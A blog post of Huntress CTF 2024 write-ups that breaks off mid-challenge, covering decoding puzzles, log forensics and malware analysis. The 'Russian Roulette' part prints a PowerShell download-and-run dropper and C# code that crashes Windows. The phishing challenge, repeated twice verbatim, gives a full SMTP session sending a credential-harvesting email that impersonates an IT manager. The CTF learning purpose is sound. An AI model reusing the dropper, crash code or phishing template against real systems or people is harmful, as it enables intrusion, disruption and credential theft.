---
layout:     post
title:      "Huntress CTF 2024"
date:       2024-11-27
categories: CTF ComSec CyberSecurity Huntress
---

Tuesday, October 1, 2024
    - [ ] [read_the_rules](#read_the_rules)
    - [ ] [technical_support](#technical_support)
    - [ ] [more_challenges_tomorrow](#more_challenges_tomorrow)
    - [x] [matryoshkaQR](#matryoshkaQR)
    - [x] [base64by32](#base64by32)
    - [x] [too_many_bits](#too_many_bits)
    - [x] [strange_calc](#strange_calc)

Wednesday, October 2, 2024
    - [x] [No Need For Brutus](#No Need For Brutus)
    - [x] [Red Phish Blue Phish](#Red Phish Blue Phish)

Thursday, October 3, 2024
    - [x] [cattle](#cattle)
    - [x] [Nightmare on Hunt Street (Bundle)](#Nightmare on Hunt Street (Bundle))
    - [x] [russian_roulette](#russian_roulette)

Friday, October 4, 2024
    - [x] [whamazon](#whamazon)
    - [x] [malibu](#malibu)

Saturday, October 5, 2024
    - [x] [unbelievable](#unbelievable)
    - [ ] ~~ocean_locust~~

Sunday, October 6, 2024
    - [x] [txt_message](#txt_message)
    - [x] [discount_programming_devices](#discount_programming_devices)

Monday, October 7, 2024
    - [x] [mimi](#mimi)
    - [x] [system_code](#system_code)

Tuesday, October 8, 2024
    - [x] [zimmer_down](#zimmer_down)
    - [x] [ran_somewhere](#ran_somewhere)
    - [ ] [base_-p-](#base_p)
    - [x] [mystery](#mystery)

Wednesday, October 9, 2024
    - [x] [GoCrackMe1](#GoCrackMe1)
    - [x] [i_cant_ssh](#i_cant_ssh)

Thursday, October 10, 2024
    - [ ] ~~GoCrackMe2~~
    - [x] [finders_fee](#finders_fee)

Friday, October 11, 2024
    - [ ] ~~GoCrackMe3~~
    - [x] [typo](#typo)

Saturday, October 12, 2024
    - [ ] ~~x-ray~~
    - [ ] ~~zulu~~

Sunday, October 13, 2024
    - [ ] ~~ObfuscationStation~~
    - [ ] [Little Shop Of Hashes (Bundle)](#Little Shop Of Hashes (Bundle))

Monday, October 14, 2024
    - [ ] [keyboard_junkie](#keyboard_junkie)
    - [ ] [HiddenStreams](#HiddenStreams)

Tuesday, October 15, 2024
    - [ ] [sekiro](#sekiro)
    - [ ] [transmissions](#transmissions)

Wednesday, October 16, 2024
    - [ ] [echo_chamber](#echo_chamber)
    
Thursday, October 17, 2024
    - [ ] [linux_basics](#linux_basics)
    - [x] [the_void](#the_void)
    - [ ] ~~moveable~~
    - [x] [baby buffer overflow](#baby buffer overflow)

Friday, October 18, 2024
    - [ ] [eepy](#eepy)
    - [ ] [permission_to_proxy](#permission_to_proxy)

Saturday, October 19, 2024
    - [ ] [stack_it](#stack_it)
    - [ ] ~~eco_friendly~~

Sunday, October 20, 2024
    - [ ] [y2j](#y2j)
    - [ ] ~~splunk_ii~~

Monday, October 21, 2024
    - [ ] ~~rsa_decrypt~~
    - [ ] [helpfuldesk](#helpfuldesk)

Tuesday, October 22, 2024
    - [ ] ~~rustline~~
    - [ ] [plantopia](#plantopia)

Wednesday, October 23, 2024
    - [ ] [ping_me](#ping_me)
    - [ ] ~~time_will_tell~~

Thursday, October 24, 2024
    - [ ] ~~knights_quest~~
    - [ ] ~~ancient_fossil~

Friday, October 25, 2024
    - [ ] ~~pillow_fight~~
    - [ ] [feedback](#feedback)

Saturday, October 26, 2024
    - [ ] ~~thats_life~~

Sunday, October 27, 2024
    - [ ] [revenge_of_dpd](#revenge_of_dpd)

Monday, October 28, 2024
    - [ ] ~~rusty_bin~~

Tuesday, October 29, 2024
    - [ ] ~~in_plain_sight~~

Wednesday, October 30, 2024
    - [ ] ~~zippy~~

Thursday, October 31, 2024
    - [ ] ~~Palimpsest~~

{: #matryoshkaQR}
# MatryoshkaQR
>Author: @JohnHammond
>Wow! This is a big QR code! I wonder what it says...?

Huge QR code! Using `zbarimg` I first decoded the image to reveal another PNG file - except it is an ascii text string with the starting magic number header `0x89 P N G`. If you run `file` on this, you get `ASCII text, with very long lines (943)`. This is an example of the outputted string:

```
x89PNGrnx1anx00x00x00rIHDRx00x00x00
```

It was irritating but a little bit of python can solve this. I imported the result into a string in python. Then with the **codecs** library, escape the string with `codecs.escape_decode(x)` and then write back the `byte string` using the `wb` flag.

This gives a proper PNG file: `PNG image data, 39 x 39, 1-bit grayscale, non-interlaced`. Yes. I view it and it is another QR code! This time much much smaller. Running `zbarimg` on this gives another ascii text! Thankfully this is the actual flag. yay.

{: #base64by32}
# Base64by32
> Author: @JohnHammond
> This is a dumb challenge. I'm sorry.

The title screams **Base64** so I started by running the file with `base64 -d`. Another base64 file. Trying to run `base32 -d` gives an error since the text is encoded in Base64. '64by32' reminds me of _2 by 4s_, also written _2x4s_. Ah! I wrote a little script to decode the file 32 times:

```sh
for i in {1..32}; do base64 -d "stage$i" > "stage$(($i + 1))"; done
```

The file `stage33` (ah you thought `stage32`, but nope!) had the flag.

{: #too_many_bits}
# Too Many Bits
>Author: @JohnHammond
>What do all these ones and zero's mean!?! We are in the Warmups category after all...

```
01100110 01101100 01100001 01100111 01111011 01100100 00110000 00110001 00110100 00110111 00110001 00110111 00110000 00110010 01100001 00110001 00110000 00110001 00110011 00110100 01100011 01100100 01100001 01100100 00110001 01100100 01100100 01100100 01100101 00110000 00110110 00110110 00110111 00111000 01100110 00110010 01100110 01111101
```

I opened bpython and pasted the binary string into a variable called `binary`.

I then split them and using list comprehension, converted the binary as decimal integer with `int(x,2)`, then to ascii with `chr(x)` and then joint them together to get a flag:
```py
''.join([chr(int(a,2)) for a in binary.split(' ')])
```

{: #strange_calc}
# Strange Calc
> Author: @JohnHammond
>
> I got this new calculator app from my friend! But it's really weird, for some reason it needs admin permissions to run??

Horrible horrible horrible...

This was a real bummer. I spent days and days trying to understand it. However without a windows machine, I had to rely on static anaylsis. Staring at the string output of the file, I was lost. It was UPX-compressed, so uncompressing it yields a larger file. However, as found in the original file, I knew something was up with this manifest:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
<assemblyIdentity
type="win32"
processorArchitecture="*"
version="3.0.0.0"
name="AutoIt3"
<description>AutoIt v3</description>
<!-- Identify the application security requirements. -->
<trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
<security>
<requestedPrivileges>
<requestedExecutionLevel
level="asInvoker"
uiAccess="false"/>
</requestedPrivileges>
</security>
</trustInfo>
<!-- Identify the application dependencies. -->
<dependency>
<dependentAssembly>
<assemblyIdentity
type="win32"
name="Microsoft.Windows.Common-Controls"
version="6.0.0.0"
language="*"
processorArchitecture="*"
publicKeyToken="6595b64144ccf1df"
/>
</dependentAssembly>
</dependency>
</assembly>
```

This was screaming something. It was establishing that request privileges are needed. Definitely something was being fiddled, probably the registry. But I could not do it.

Asking for hints (and also helping others) in the discord chat, I was approached by a rather interested _@JohnGypsy_. They had an offer: I help them with *Nightmare #3* and I'd be helped with this.

## Deal

I pointed them towards what the tool was used, followed on whether the logs or the system was relevant. They were very very very close. I could feel the tinder waiting to catch fire. Just needed more sparks. Meanwhile they helped confirm one thing: *AutoIT*. (In the end they found the answer!)

## AutoIT

I had to do a deeper dive into autoit. I learnt that the AutoIT files, which is a powerful scripting language for Windows Applications, are **embedded** into the executable. Ah. Now to find an extractor. Thankfully [AutoIT-ripper](https://github.com/nazywam/AutoIt-Ripper) is a Python3 package available in NixOS. I added it to my _nix-shell_ and out popped the _au3_ script file.

## Javascript's lesser known abused cousin

The _au3_ script merely decodes a base64 string using Windows API, saves it as a temporary `.jse` file, and executes it. I learnt that `jse` files were Microsoft's attempt at offering obfuscation for their ECMA-derivative, *JScript*. Reading this write-up on [cracking the JScript Encode obfuscation](https://web.archive.org/web/20131208110057/http://virtualconspiracy.com/content/articles/breaking-screnc), it was an attempt at deterring the prying eyes from glancing through the inner workings of JScript files

[C code compilable in UNIX systems](https://web.archive.org/web/20140209124110/http://www.virtualconspiracy.com/download/scrdec18.c)

{: #No Need For Brutus}
# No need for Brutus
> Author: @aenygma
>
> A simple message for you to decipher:
>
> squiqhyiiycfbudeduutvehrhkjki
>
> Submit the original plaintext hashed with MD5, wrapped between the usual flag format: flag{}

In hindsight, **Brutus** is a big flag HAHAHAH but when I looked at this string, I saw some interesting clues:

- repeated letters like *ii* and *uu*
- the letters that appear like *y* and *k* at one part but not throughout
- all alphabets, no numbers or symbols

This has to be a shift-cipher. I had a tummy ache, so while on Neptune's throne I copied the text and searched for an online cipher app, [this one in particular](https://cryptii.com/pipes/caesar-cipher). I pasted, and then I slowly incremented the shift count one by one. At 16 (a -> q), I suddenly saw a _caesar_ in the plaintext output. I had accidentally incremented so i went back and yup!

**caesarissimplenoneedforbrutus**

I piped this into the `md5sum` to get the hash and inputted the flag, according to the instructions.

{: #Red Phish Blue Phish}
# Red Phish Blue Phish
> Author: Truman Kain (@truman.huntress), Adam Rice (@adam.huntress)
> You are to conduct a phishing excercise against our client, Pyrch Data.
>
> We've identified the Marketing Director, Sarah Williams (swilliams@pyrchdata.com), as a user susceptible to phishing.
>
> Are you able to successfully phish her? Remember your OSINT ;)
>
> NOTE: The port that becomes accessible upon challenge deployment is an SMTP server. Please use this for sending any phishing emails.
>
> You will not receive an email/human response as the mail infrastructure for this challenge is emulated.

This was very very fun! I learnt a lot on SMTP conversations. I first did some OSINT. A quick google yields the following website: `pyrchdata.com`.

![Image of Webpage]()

Very generic, but the disclaimer at the end was assuring:

> This site was created for the Huntress Cybersecurity Awareness Month CTF.

Going to the *meet the team* page, I saw our poor target, Sarah Williams (if you reverse search, the image is just a generic stock photo). I saw the perfect person to impersonate: **Joe Daveren** (_IT Security Manager_). Any jargon I throw at Williams signed off as the IT security manager would definitely work.

![Image of About Us]()

The next part was trying to understand SMTP server conversations. I had to read up and honestly it was fun! I tried to manually key in one by one, but it was painful. So based on [this helpful StackOverflow post on SMTP over NetCat](https://stackoverflow.com/questions/44250054/send-email-with-netcat), I drafted a SMTP input text file, and a quick function to slowly pipe the text line by line to netcat since it will take awhile for the SMTP to receive and acknowledge each line sent over:

```sh
function slowcat(){ cat "$1" | while read; do sleep .05; echo "$REPLY"; done; }
```

This was what was sent over:
```
HELO challenge.ctf.games
MAIL FROM:<jdaveren@pyrchdata.com>
RCPT TO:<swilliams@pyrchdata.com>
DATA
From: [IT Security] <jdaveren@pyrchdata.com>
To: <swilliams@pyrchdata.com>
Date: Fri, 4 Oct 2024 - 04:09:11 +0000
Subject: Upgrading 2FA for Infrastructure Security

Dear Sarah Williams,

Hope this email finds you well. My phone is down so I have to draft this quick email. Please forgive any formatting and grammar!

For our upcoming IT Infrastructure Security Update, we require your cooperation in verifying your Email Login Username and Password. This is to ensure that the system security infrastructure is working as intended. Further next week, I will personally be addressing everyone in the team about the new changes.

Have a good day!

Best Regards,
Joe Deveren
IT Security Manager


.
QUIT

```

Yes very creative eheh. `HELO`, `MAIL`, `RCPT`, `DATA` (terminated with `<CR><LF>.<CR><LF>`), and `QUIT` are SMTP commands. At first, the system just lagged, but then I realised my newlines are not `<CR><LF>` as expected, so the SMTP server still thinks I am entering the DATA segment. I had to run `awk '{printf "%srn", $0}'` to convert the newlines.

Finally, when I pipe the `slowcat` function into `nc`, I got the response I was waiting for: **250 Ok.** and then the flag.

# Red Phish Blue Phish
> Author: Truman Kain (@truman.huntress), Adam Rice (@adam.huntress)
> You are to conduct a phishing excercise against our client, Pyrch Data.
>
> We've identified the Marketing Director, Sarah Williams (swilliams@pyrchdata.com), as a user susceptible to phishing.
>
> Are you able to successfully phish her? Remember your OSINT ;)
>
> NOTE: The port that becomes accessible upon challenge deployment is an SMTP server. Please use this for sending any phishing emails.
>
> You will not receive an email/human response as the mail infrastructure for this challenge is emulated.

This was very very fun! I learnt a lot on SMTP conversations. I first did some OSINT. A quick google yields the following website: `pyrchdata.com`.

![Image of Webpage]()

Very generic, but the disclaimer at the end was assuring:

> This site was created for the Huntress Cybersecurity Awareness Month CTF.

Going to the *meet the team* page, I saw our poor target, Sarah Williams (if you reverse search, the image is just a generic stock photo). I saw the perfect person to impersonate: **Joe Daveren** (_IT Security Manager_). Any jargon I throw at Williams signed off as the IT security manager would definitely work.

![Image of About Us]()

The next part was trying to understand SMTP server conversations. I had to read up and honestly it was fun! I tried to manually key in one by one, but it was painful. So based on [this helpful StackOverflow post on SMTP over NetCat](https://stackoverflow.com/questions/44250054/send-email-with-netcat), I drafted a SMTP input text file, and a quick function to slowly pipe the text line by line to netcat since it will take awhile for the SMTP to receive and acknowledge each line sent over:

```sh
function slowcat(){ cat "$1" | while read; do sleep .05; echo "$REPLY"; done; }
```

This was what was sent over:
```
HELO challenge.ctf.games
MAIL FROM:<jdaveren@pyrchdata.com>
RCPT TO:<swilliams@pyrchdata.com>
DATA
From: [IT Security] <jdaveren@pyrchdata.com>
To: <swilliams@pyrchdata.com>
Date: Fri, 4 Oct 2024 - 04:09:11 +0000
Subject: Upgrading 2FA for Infrastructure Security

Dear Sarah Williams,

Hope this email finds you well. My phone is down so I have to draft this quick email. Please forgive any formatting and grammar!

For our upcoming IT Infrastructure Security Update, we require your cooperation in verifying your Email Login Username and Password. This is to ensure that the system security infrastructure is working as intended. Further next week, I will personally be addressing everyone in the team about the new changes.

Have a good day!

Best Regards,
Joe Deveren
IT Security Manager


.
QUIT

```

Yes very creative eheh. `HELO`, `MAIL`, `RCPT`, `DATA` (terminated with `<CR><LF>.<CR><LF>`), and `QUIT` are SMTP commands. At first, the system just lagged, but then I realised my newlines are not `<CR><LF>` as expected, so the SMTP server still thinks I am entering the DATA segment. I had to run `awk '{printf "%srn", $0}'` to convert the newlines.

Finally, when I pipe the `slowcat` function into `nc`, I got the response I was waiting for: **250 Ok.** and then the flag.

{: #cattle}
# Cattle
> Author: @JohnHammond
> I know it's an esoteric challenge for a Capture the Flag, but could you herd these cows for me?

"**esoteric**". Very strange. The file was also hilarious. Here's the first line:
```
OOO MoO MoO MoO MoO MoO MoO MoO MoO MMM moO MMM MMM moO MMM MOO MOo mOo MoO moO moo mOo
```

I knew it was an esoteric language, and needed to find the correct interpreter. Quick google search taught me it was **Cow** language, and i used [this online interpreter](https://frank-buss.de/cow.html) to evaluate and get the flag.

{: #Nightmare on Hunt Street (Bundle)}
# Nightmare on Hunt Street
> Author: Austin Worline, Jose Oregon, and Adrian Garcia
>
> DeeDee hears the screams,
> In the logs, a chilling trace—
> Freddy's waiting near.
>
> Are you able to unravel the attack chain?

This was a nightmare - number 3 in particular. The flags are not in standard form either. The files given are in the _Windows Event Log file (evtx)_ file format. Thankfully the `evtx_dump` from the `evtx` nix package converts them into `xml` files. `Application` logs were empty, but the rest weren't. Ultimately, only `Security.evtx` was needed for all questions.

## Question 1
> What is the IP address of the host that the attacker used?

Doing a (rip)grep for the canonical IPv4 address (`d{1,3}.d{1,3}.d{1,3}.d{1,3}`) yields one offender (Redacted): `10.X.X.XX`.

## Question 2
> How many times was the compromised account brute-forced? Answer just the integer value.

Looking at the XML file, each remote login attempt (done via **NTLM**) has the offending IP tagged, so I tried to run the results of (rip)grep into `wc -l` to count the lines. **41** times the IP address has interacted. It was the wrong answer. OOPS.

However, in terms of brute-forcing, I went into the file and just _Find Next_ until the event entry was not the same (indicating the brute-force was successful).

An example brute-force attempt that failed looks like this:

```xml
Record 234219
<?xml version="1.0" encoding="utf-8"?>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
<System>
<Provider Name="Microsoft-Windows-Security-Auditing" Guid="54849625-5478-4994-A5BA-3E3B0328C30D">
</Provider>
<EventID>4625</EventID>
<Version>0</Version>
<Level>0</Level>
<Task>12544</Task>
<Opcode>0</Opcode>
<Keywords>0x8010000000000000</Keywords>
<TimeCreated SystemTime="2024-09-24T21:06:30.765148Z">
</TimeCreated>
<EventRecordID>234219</EventRecordID>
<Correlation ActivityID="1A7873A0-0EC0-0001-3174-781AC00EDB01">
</Correlation>
<Execution ProcessID="660" ThreadID="760">
</Execution>
<Channel>Security</Channel>
<Computer>EC2AMAZ-0TD157D</Computer>
<Security>
</Security>
</System>
<EventData>
<Data Name="SubjectUserSid">S-1-0-0</Data>
<Data Name="SubjectUserName">-</Data>
<Data Name="SubjectDomainName">-</Data>
<Data Name="SubjectLogonId">0x0</Data>
<Data Name="TargetUserSid">S-1-0-0</Data>
<Data Name="TargetUserName">Jsmith</Data>
<Data Name="TargetDomainName">EC2AMAZ-0TD157D</Data>
<Data Name="Status">0xc000006d</Data>
<Data Name="FailureReason">%%2313</Data>
<Data Name="SubStatus">0xc000006a</Data>
<Data Name="LogonType">3</Data>
<Data Name="LogonProcessName">NtLmSsp </Data>
<Data Name="AuthenticationPackageName">NTLM</Data>
<Data Name="WorkstationName">KALI</Data>
<Data Name="TransmittedServices">-</Data>
<Data Name="LmPackageName">-</Data>
<Data Name="KeyLength">0</Data>
<Data Name="ProcessId">0x0</Data>
<Data Name="ProcessName">-</Data>
<Data Name="IpAddress">10.X.X.XX</Data>
<Data Name="IpPort">49468</Data>
</EventData>
</Event>
```

Note the `<EventID>4625</EventID>` which indicates this is a "Failed Login" attempt. `FailureReason %%23131` and `SubStatus 0xc000006a` indicates a valid username (`Jsmith`) but an invalid password was used, while `LogonType 3` confirms this is a remote login. This type of event record occurs **32** times, which indicates the number of brute-force attempts (that failed).

## Question 3
> What is the name of the offensive security tool that was used to gain initial access? Answer in all lowercase.

**THIS WAS HORRIBLE**. But I will give this analogy:
> Some countries used tanks to run an offensive move and invade a country.
> Some countries, like the Japs in WW2, ride bicycles as offensive to invade and overthrow Britain.
> Any vehicle allows an offensive strike, if it brings you forth.

So. I at first was at a lost. I knew from the logs that the system attacking was using **Kali**, or at least they were claiming to be. So I went through every single possible toolset, from _Hashcat_ to _Revolver_ to _CrackMapExec_ to _Patator_. I even got _chatGPT_ to brainstorm with me, and even tried to analyse the _FNAF_ reference in the task information. I then went to the discord server. I was glad that many were struggling. I saw people complaining how the answer is not a _offensive tool_ per se, and that _keyboard_ could be an offensive tool in this context. So the only thing I had left was to try figure out, perhaps _what can you use to connect login remotely via NTLM_. Something like _(open)ssh_ but for windows. I even tried _zsh_, _ssh_, _cmd_, _**ps**_.

It took me embarrassingly long to find out about **psexec**. That is the remote connecting tool for windows to connect to NTLM server. wow.

## Question 4
> How many unique enumeration commands were run with net.exe? Answer just the integer value.

I run (rip)grep for `net1.exe` commands, after browsing the logs and noticing that the `net.exe` were executed with `net1` command. I remove the duplicates, and get this:

1. `net1 localgroup administrators susan_admin /ADD`
2. `net1 localgroup`
3. `net1 share`
4. `net1 user susan_admin &quot;SusanIsStrong123&quot; /ADD`
5. `net1 user susan_admin Susan123! /ADD`
6. `net1 user susan_admin SusanIsStrong123 /ADD`
7. `net1 user`
8. `net1 users`

Since they asked for **unique** and **enumeration** commands, (1) and (4 - 6) are out. I was not sure if `users` and `user` were valid commands, and if `localgroup` and `share` enumerated the users too, so I just had to try either 2, 3, or 4. Answer is 3.

## Question 5
> What password was successfully given to the user created?

Following Question 4, we got the following commands to add a new user:

1. `net1 user susan_admin &quot;SusanIsStrong123&quot; /ADD`
2. `net1 user susan_admin Susan123! /ADD`
3. `net1 user susan_admin SusanIsStrong123 /ADD`

(2) is `Susan123!` while (2) and (3) is `"SusanIsStrong123"`.

The correct command is (2) and (3), however since (2) was successful, (3) would fail to add the `susan_admin` user with the second password. This leaves (2) with the successful command, and `Susan123!` as the password.

{: #russian_roulette}
# Russian Roulette
> Author: @JohnHammond
>
> My PowerShell has been acting really weird!! It takes a few seconds to start up, and sometimes it just crashes my computer!?!?! :(
>
> WARNING: Please examine this challenge inside of a virtual machine for your own security. Upon invocation there is a real possibility that your VM may crash.
>
> NOTE: Archive password is russian_roulette

This was fun. It reminded me of the days I spent binge watching John Hammond's [malware analysis videos](https://www.youtube.com/playlist?list=PL1H1sBF1VAKWMn_3QPddayIypbbITTGZv). The static analysis was very very lengthy, but very very fun and rewarding!

## step 1: lnk file
Running on linux, I could not open the lnk file. I ran `strings` on the lnk file, and got nothing. Then I realised windows uses long string encodings, or 16-bit UTF little endian. When viewing with `hexdump -C` you can see the strings broken with a dot in between - since the hexdump is showing 8-bit by 8-bit. Running `strings -el` for long encoding yields this:

```
powershell.exe
?......WindowsSystem32WindowsPowerShellv1.0powershell.exe
C:Windowssystem32
-e aQB3AHIAIABpAHMALgBnAGQALwBqAHcAcgA3AEoARAAgAC0AbwAgACQAZQBuAHYAOgBUAE0AUAAvAC4AYwBtAGQAOwAmACAAJABlAG4AdgA6AFQATQBQAC8ALgBjAG0AZAA=
```

So:

1. Powershell is being invoked
2. There is a base64 encoded string

Decoding the base64 string gives (URL redacted):

```
iwr is.gd/<REDACTED> -o $env:TMP/.cmd;& $env:TMP/.cmd
```

There's a few things happening:

1. `iwr` is the Powershell 'curl', invoking a web request from the URL `is.gd/<REDACTED>`
2. It is saved it into a temporary `cmd` file.
3. This CMD file is then executed (with the `&` ampersand shorthand alias).

## step 2: getting the remote file
So we found there is a remote file being fetched. I try to `curl` it but there is a HTTP302 error. I could have just enabled the redirections flag in curl, but I got lazy and did what any sane person would do - just paste the URL into my web browser.

A file downloads, which i believe is the next stage of this malware.

## step 3: decipher this CMD file
If you try to view this file, this happens:

![Image of powershell cmd]()

Now, I speak Mandarin, and can read Korean, but this is garbage as far as I can tell. Pushing this into ghidra crashes my computer (This happens again in [[OceanLocust]]). Oh no.

However, I found this by mistake. If you run `head` you get this instead:

```sh
&cls
@echo off
set ucbw=set
:: Путешествия в воображении, как и путешествия в реальности, могут привести к удивительным открытиям и незабываемым встречам с персонажами, которые живут на грани воображаемого и реального.
%ucbw% qmy=
:: Песнь птиц, запутавшаяся в ветвях деревьев, как древний гимн жизни, разносится по лесу, наполняя его радостью и напоминая о том, что природа всегда была и будет в движении.
%ucbw%%qmy%jxaa==
:: Чудеса происходят тогда, когда мироздание вдруг решает повернуть ход истории в неожиданных направлениях, создавая прекрасные узоры на полотне жизни.
%ucbw%%qmy%ccdn%jxaa%/
:: Песнь птиц, запутавшаяся в ветвях деревьев, как древний гимн жизни, разносится по лесу, наполняя его радостью и напоминая о том, что природа всегда была и будет в движении.
```

I don't speak Russian but:

1. This confirms the *Russian* part of this quest
2. This is a batch (CMD) file
3. Where did the Chinese characters come from?

Running hexdump reveals something:

```
00000000  ff fe 26 63 6c 73 0d 0a  40 65 63 68 6f 20 6f 66  |..&cls..@echo of|
00000010  66 0d 0a 73 65 74 20 75  63 62 77 3d 73 65 74 0d  |f..set ucbw=set.|
00000020  0a 3a 3a 20 d0 9f d1 83  d1 82 d0 b5 d1 88 d0 b5  |.:: ............|
00000030  d1 81 d1 82 d0 b2 d0 b8  d1 8f 20 d0 b2 20 d0 b2  |.......... .. ..|
```

When I ran cat, the encoding was *UTF-16 LE* but looking at the hex dump it was 8-bit ascii. Even `file` says `Unicode text, UTF-16, little-endian text`. The first 2 bytes is why. `FF FE` is the **BOM encoding for UTF-16 LE**. That is why. `head` and `cmd` only interprets 8-bit ASCII, so by _incorrectly_ interpreting the file, they actually read the correct file.

Running `dd bs=1 skip=2` skips the first 2 bytes, and now the file renders correctly.

## step 4: undo the obfuscation

The file is full of rewriting commands with single characters denoted by variables. After this I will omit the Russian text, but at the end of this segment I will include a snippet of the code.

```sh
&cls
@echo off
set ucbw=set
:: Путешествия в воображении, как и путешествия в реальности, могут привести к удивительным открытиям и незабываемым встречам с персонажами, которые живут на грани воображаемого и реального.
set qmy=
:: Песнь птиц, запутавшаяся в ветвях деревьев, как древний гимн жизни, разносится по лесу, наполняя его радостью и напоминая о том, что природа всегда была и будет в движении.
set jxaa==
:: Чудеса происходят тогда, когда мироздание вдруг решает повернуть ход истории в неожиданных направлениях, создавая прекрасные узоры на полотне жизни.
set ccdn=/
```

This is tedious, but it is solvable with a little `sed`. Firstly convert the `set ([a-z]*)=(.)` to `s/%$1%/$2/g` since windows CMD uses `%var%` to substitute variables. Then using `sed`'s `-f` flag to use a file for commands, unobfuscate the file.


Further down, there's this too:
```sh
set /a rtoy=9161456 %% 9161359
:: Теплый ветер приносит с собой запахи далёких стран, где культура смешивается с историей, а каждый камень на мостовой хранит в себе тайны веков.
cmd /c exit %rtoy%
:: Никто не знает, почему луна светит так ярко, и почему звезды, словно рассыпанные бисеринки, освещают путь к неизведанным уголкам вселенной.
set ztq=%=exitcodeAscii%
:: Поле битвы меняет свои очертания с каждым шагом, словно его границы никогда не были определены, а правила игры пишутся на ходу великими тактиками прошлого и будущего.
set /a ltjf=7630868 %% 7630770
:: Древние тексты, вырезанные на каменных плитах, рассказывают истории забытых королей и воинов, которые жили и умирали ради идей, оставив след в самой ткани мироздания.
cmd /c exit %ltjf%
:: Часы тикают, как неумолимые маркеры времени, напоминая, что каждое мгновение — это шанс изменить свою судьбу и оставить свой след на страницах истории.
set fqhx=%=exitcodeAscii%
:: Искусство танца — это не просто движение, это история, рассказанная телом, это эмоции, переданные без слов, это путешествие души в ритме музыки и гармонии.
```

A few things are happening:

1. a random variable is set with the result (`/a`) of the following modulo statement (`X %% Y`)
2. using `cmd /c` an arbitrary command (`exit X`) is run that exits with the exit value of the previously calculated variable
3. another new random variable is set with the exit value, using the read-only variable `%=exitcodeAscii%`. This gets the ascii character of the exit value.

This is such a crazy way to convert integers into ascii characters! A lot of vim macros (the `=` register can compute the modulo), and some `sed`s later, we get another base64 code that is interpreted by Powershell.

## step 5: Final payload

Decoding the base64 yields another base64 code, which again deciphered gives a rather interesting embedded **C#** code in a Powershell script. It is in UTF-16LE, so a bit of tidying up has to be done.

```powershell
$c=New-Object System.CodeDom.Compiler.CompilerParameters
$c.CompilerOptions='/unsafe'
$a=Add-Type -TypeDefinition $s -Language CSharp -PassThru -CompilerParameters $c

if((Get-Random -Min 1 -Max 7) -eq 1) {
[X]::Shot()
}
Start-Process "powershell.exe"
```

Here we see the **Roulette** part of the task. The C# code, in the string `$s`, is compiled and loaded. There is a one-in-seven chance of running the code, else the if-block is skipped and a normal Powershell is executed.

The C# segment is as followed:

```cs
using System
using System.Text
using System.Security.Cryptography
using System.Runtime.InteropServices
using System.IO
public class X
{
[DllImport("ntdll.dll")]
public static extern uint RtlAdjustPrivilege(int p,bool e,bool c,out bool o)

[DllImport("ntdll.dll")]
public static extern uint NtRaiseHardError(uint e,uint n,uint u,IntPtr p,uint v,out uint r)

public static unsafe string Shot()
{
bool o
uint r
RtlAdjustPrivilege(19,true,false,out o)
NtRaiseHardError(0xc0000022,0,0,IntPtr.Zero,6,out r)
byte[]c=Convert.FromBase64String("RNo8TZ56Rv+EyZW73NocFOIiNFfL45tXw24UogGdHkswea/WhnNhCNwjQn1aWjfw")
byte[]k=Convert.FromBase64String("/a1Y+fspq/NwlcPwpaT3irY2hcEytktuH7LsY+NlLew=")
byte[]i=Convert.FromBase64String("9sXGmK4q9LdYFdOp4TSsQw==")
using(Aes a=Aes.Create())
{
a.Key=k
a.IV=i
ICryptoTransform d=a.CreateDecryptor(a.Key,a.IV)
using(var m=new MemoryStream(c))
using(var y=new CryptoStream(m,d,CryptoStreamMode.Read))
using(var s=new StreamReader(y))
{
return s.ReadToEnd()
}
}
}
}
```

There is the `NtRaiseHardError` which presumably crashes the computer by causing an BSOD. Anyways, the important part is here:

```cs
byte[]c=Convert.FromBase64String("RNo8TZ56Rv+EyZW73NocFOIiNFfL45tXw24UogGdHkswea/WhnNhCNwjQn1aWjfw")
byte[]k=Convert.FromBase64String("/a1Y+fspq/NwlcPwpaT3irY2hcEytktuH7LsY+NlLew=")
byte[]i=Convert.FromBase64String("9sXGmK4q9LdYFdOp4TSsQw==")
using(Aes a=Aes.Create())
{
a.Key=k
a.IV=i
ICryptoTransform d=a.CreateDecryptor(a.Key,a.IV)
using(var m=new MemoryStream(c))
using(var y=new CryptoStream(m,d,CryptoStreamMode.Read))
using(var s=new StreamReader(y))
{
return s.ReadToEnd()
}
}
```

Slapping this into an online C# compiler and printing the return value yields the flag. Yay.

## Russian Text
If you're interested, I have included the [russian text here](https://gist.github.com/yadobler/d4fd9f91caba501af824353c3ca50af3).

{: #whamazon}
# Whamazon
> Author: @JohnHammond
>
> Wham! Bam! Amazon is entering the hacking business! Can you buy a flag?

A GoTTY terminal on the web is created. Strangely with **Dark Reader** plugin the display was broken, so I had to do it on incognito. It is an interactive terminal with numbers to choose options presented.

![Whamazon]()

## Buy the flag?

First off, trying to buy the flag. It costs $1000000000 and I apparently only have 50 bucks. I had to manipulate and spend negative money to earn money.

## Maths

I try buying an apple. Apple costs 3 bucks, and I am asked how much I want. I go straight for the `-1` and sure enough, I now have **53 bucks**. eheh. I go straight and bought another **-1000000000** apples and became rich. _Great deal buying an Apple from Whamazon._

![Whamazon apples]()

## Scissors Paper Stone

Next is Rock Paper Scissors (or where I'm from, _scissors, paper, stone_). Apparently when I try to purchase this, I need to battle the terminal. It tries to "psych" me by saying it will not choose _Rock_, so I choose Rock. It choose Paper. Then again I choose Paper and it chose Paper. Strange. Then I chose Scissors and it chose Paper. It lost. What. Then it gave me the flag.

## Flag?

Yes that's it. I go to my inventory and there the flag is. Very fun warm-up!

{: #malibu}
# Malibu
> Author: Truman Kain
>
> What do you bring to the beach?
>
> NOTE: There are two things to note for this challenge.
> This service takes a bit more time to start. If you see a Connection refused, please wait a bit more.
> This service will not immediately respond or prompt you... it is waiting for your input. If you just hit Enter, you will see what it is.
> Extra tip, once you know what the service is, try connecting in a better way. Then use some of the context clues and critical thinking based off its response and the challenge description. You don't need any bruteforcing once you understand the infrastructure and enumerate. ;)


## What is happening?

Diving head first, I used _netcat_ as suggested. Pressing enter without any input yields:
```
HTTP/1.1 400 Bad Request
Content-Type: text/plain; charset=utf-8
Connection: close

400 Bad Request
```
Anyways, I understand that the server is expecting an _HTTP_ request. Posting a valid request:

```http
GET / HTTP/1.1
Host: challenge.ctf.games:PORT
```

Yields:
```
